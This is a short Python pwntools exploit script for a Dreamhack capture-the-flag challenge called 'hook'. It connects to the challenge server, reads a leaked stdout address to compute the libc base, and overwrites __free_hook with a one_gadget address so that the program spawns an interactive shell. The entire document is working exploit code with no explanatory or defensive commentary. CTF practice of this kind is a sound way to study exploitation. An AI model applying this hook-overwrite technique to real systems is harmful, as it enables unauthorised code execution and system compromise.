from pwn import *

#p = process("./hook")

p = remote("host3.dreamhack.games",18933)

e = ELF("./hook")
libc = ELF('./libc-2.23.so')
	
# receive stdout's address
p.recvuntil("stdout: ")
stdout_address =int(p.recvline()[:-1],16)
print("stdout:",hex(stdout_address))

# stdout's offset = 0x3c5708
libc_base = stdout_address - libc.symbols["_IO_2_1_stdout_"]
print("libc_base:",hex(libc_base))
	
# __free_hook's offset = 0x3c3ef8
free_hook = libc_base + libc.symbols["__free_hook"]
print("__free_hook:",hex(free_hook))

one_shot_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
one_shot = libc_base + one_shot_offset[1]
print("one_shot:",hex(one_shot))

payload = p64(free_hook)
payload += p64(one_shot)

p.recvuntil("Size: ")
p.sendline('1000')

p.recvuntil("Data: ")
p.sendline(payload)
	
p.interactive()
